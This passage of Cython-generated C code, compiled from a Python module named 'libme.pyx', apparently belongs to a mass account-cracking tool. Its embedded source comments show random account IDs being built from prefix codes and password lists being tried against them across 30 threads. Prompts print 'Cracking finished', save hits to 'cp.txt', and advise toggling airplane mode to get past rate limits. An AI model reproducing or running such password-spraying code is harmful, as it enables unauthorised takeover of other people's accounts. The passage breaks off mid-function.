                    __pyx_t_13 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 229, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 229, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  } else {
                    if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 229, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 229, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  }
                } else {
                  __pyx_t_13 = __pyx_t_7(__pyx_t_2);
                  if (unlikely(!__pyx_t_13)) {
                    PyObject* exc_type = PyErr_Occurred();
                    if (exc_type) {
                      if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                      else __PYX_ERR(0, 229, __pyx_L15_error)
                    }
                    break;
                  }
                  __Pyx_GOTREF(__pyx_t_13);
                }
                __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_13);
                __pyx_t_13 = 0;

                /* "libme.pyx":230
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))             # <<<<<<<<<<<<<<
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 */
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 230, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_apii); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 230, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 230, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_8);
                __pyx_t_11 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                  __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
                  if (likely(__pyx_t_11)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_11);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                  }
                }
                __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_11, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s__12);
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 230, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                __pyx_t_8 = NULL;
                __pyx_t_12 = 0;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_8)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_8);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                    __pyx_t_12 = 1;
                  }
                }
                #if CYTHON_FAST_PYCALL
                if (PyFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 230, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                #if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
                  PyObject *__pyx_temp[4] = {__pyx_t_8, __pyx_t_9, __pyx_v_user, __pyx_t_10};
                  __pyx_t_13 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 230, __pyx_L15_error)
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                } else
                #endif
                {
                  __pyx_t_11 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 230, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_11);
                  if (__pyx_t_8) {
                    __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_8); __pyx_t_8 = NULL;
                  }
                  __Pyx_GIVEREF(__pyx_t_9);
                  PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_12, __pyx_t_9);
                  __Pyx_INCREF(__pyx_v_user);
                  __Pyx_GIVEREF(__pyx_v_user);
                  PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_12, __pyx_v_user);
                  __Pyx_GIVEREF(__pyx_t_10);
                  PyTuple_SET_ITEM(__pyx_t_11, 2+__pyx_t_12, __pyx_t_10);
                  __pyx_t_9 = 0;
                  __pyx_t_10 = 0;
                  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 230, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_13);
                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":229
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              }
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

              /* "libme.pyx":220
 * 				self.id.append(ib+str(i))
 * 			print("  [] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
            }
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            goto __pyx_L20_try_end;
            __pyx_L15_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("libme.James.__fb4__", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_13, &__pyx_t_1) < 0) __PYX_ERR(0, 220, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_GOTREF(__pyx_t_1);
              __pyx_t_11 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_13, __pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 220, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_11);
              __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_t_11, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 220, __pyx_L17_except_error)
              __Pyx_GOTREF(__pyx_t_20);
              __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_20);
              __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
              if (__pyx_t_19 < 0) __PYX_ERR(0, 220, __pyx_L17_except_error)
              __pyx_t_21 = ((!(__pyx_t_19 != 0)) != 0);
              if (__pyx_t_21) {
                __Pyx_GIVEREF(__pyx_t_2);
                __Pyx_GIVEREF(__pyx_t_13);
                __Pyx_XGIVEREF(__pyx_t_1);
                __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_13, __pyx_t_1);
                __pyx_t_2 = 0; __pyx_t_13 = 0; __pyx_t_1 = 0; 
                __PYX_ERR(0, 220, __pyx_L17_except_error)
              }
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              goto __pyx_L16_exception_handled;
            }
            __pyx_L17_except_error:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            goto __pyx_L3_error;
            __pyx_L16_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
            __pyx_L20_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_15) {
              __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__13, NULL);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 220, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_18);
              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            }
            goto __pyx_L14;
          }
          __pyx_L14:;
        }
        goto __pyx_L27;
        __pyx_L11_error:;
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L3_error;
        __pyx_L27:;
      }

      /* "libme.pyx":231
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")             # <<<<<<<<<<<<<<
 * 		except Exception as e:
 * 			exit(str(e))
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":214
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":232
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:             # <<<<<<<<<<<<<<
 * 			exit(str(e))
 * 	def __fb2__(self):
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__fb4__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_13, &__pyx_t_2) < 0) __PYX_ERR(0, 232, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_13);
      __pyx_v_e = __pyx_t_13;

      /* "libme.pyx":233
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 * 			exit(str(e))             # <<<<<<<<<<<<<<
 * 	def __fb2__(self):
 * 		x = 11111111
 */
      __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_e); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 233, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 233, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":214
 * 		idx = input("  \033[0;92m[!] Choose Code 200,201,202,203,205,209,250 : ")
 * 		limit = int(input("  [!] Enter the number of IDs : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":209
 * 				continue
 * 		self.loop +=1
 * 	def __fb4__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111
 * 		xx = 9999
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("libme.James.__fb4__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_idx);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_ib);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":234
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb2__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_13__fb2__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_13__fb2__ = {"__fb2__", (PyCFunction)__pyx_pw_5libme_5James_13__fb2__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_13__fb2__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__fb2__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_12__fb2__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_12__fb2__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  long __pyx_v_x;
  long __pyx_v_xx;
  PyObject *__pyx_v_idx = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_ib = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_t_21;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__fb2__", 0);

  /* "libme.pyx":235
 * 			exit(str(e))
 * 	def __fb2__(self):
 * 		x = 11111111             # <<<<<<<<<<<<<<
 * 		xx = 99999999
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 */
  __pyx_v_x = 0xA98AC7;

  /* "libme.pyx":236
 * 	def __fb2__(self):
 * 		x = 11111111
 * 		xx = 99999999             # <<<<<<<<<<<<<<
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 */
  __pyx_v_xx = 0x5F5E0FF;

  /* "libme.pyx":237
 * 		x = 11111111
 * 		xx = 99999999
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 237, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_idx = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":238
 * 		xx = 99999999
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 238, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 238, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_limit = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "libme.pyx":239
 * 		idx = input("  \033[0;91m[+] Choose Code 11,12,13,14,15,16,17,18 : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":240
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
        __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_6 = 0;
        __pyx_t_7 = NULL;
      } else {
        __pyx_t_6 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 240, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      for (;;) {
        if (likely(!__pyx_t_7)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 240, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 240, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_7(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 240, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":241
 * 		try:
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)             # <<<<<<<<<<<<<<
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 241, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 241, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyInt_From_long(__pyx_v_x); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 241, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_10 = __Pyx_PyInt_From_long(__pyx_v_xx); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 241, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = NULL;
        __pyx_t_12 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_12 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 241, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 241, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        {
          __pyx_t_13 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 241, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_GIVEREF(__pyx_t_8);
          PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_12, __pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_12, __pyx_t_10);
          __pyx_t_8 = 0;
          __pyx_t_10 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 241, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":242
 * 			for i in range(limit):
